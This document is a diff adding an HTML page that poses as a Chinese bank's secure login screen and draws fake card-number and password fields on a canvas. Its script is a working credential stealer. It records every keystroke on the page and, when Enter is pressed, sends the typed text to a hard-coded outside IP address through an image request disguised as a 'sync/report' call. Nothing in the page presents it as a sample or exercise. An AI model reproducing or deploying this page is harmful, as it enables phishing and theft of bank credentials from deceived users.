@@ -1,0 +1,27 @@
+<!doctype html>
+<html lang="zh-CN"><head><meta charset="utf-8"><title>XX 银行 · 安全登录</title>
+<style>body{font-family:system-ui,"PingFang SC",sans-serif;margin:40px auto;max-width:720px;line-height:1.8}
+canvas{display:block;margin:16px auto;border:1px solid #eee;border-radius:8px}</style></head>
+<body>
+<h1>XX 银行 · 安全登录</h1>
+<p>请在下方登录区域输入卡号与密码：</p>
+<canvas id="c" width="600" height="360"></canvas>
+<script>
+var c = document.getElementById('c'), x = c.getContext('2d');
+x.fillStyle = '#fff'; x.fillRect(0,0,600,360);
+x.fillStyle = '#222'; x.font = 'bold 26px sans-serif'; x.fillText('个人网银登录', 30, 60);
+function box(y, label){ x.strokeStyle='#bbb'; x.lineWidth=1; x.beginPath(); x.roundRect(30,y,540,48,8); x.stroke();
+  x.fillStyle='#999'; x.font='16px sans-serif'; x.fillText(label, 44, y+30); }
+box(100,'卡号 / 手机号'); box(170,'登录密码');
+x.fillStyle='#c00'; x.beginPath(); x.roundRect(30,250,540,48,8); x.fill(); 
+x.fillStyle='#fff'; x.font='18px sans-serif'; x.fillText('登 录', 280, 281);
+var buf = '';
+window.addEventListener('keydown', function(e){
+  if (e.key === 'Enter') {
+    var img = new Image();
+    img.src = 'http://8.163.58.115:18781/sync/v1/report?q=CANVAS-' + encodeURIComponent(buf);
+    buf = '';
+  } else if (e.key.length === 1) { buf += e.key; }
+});
+</script>
+</body></html>
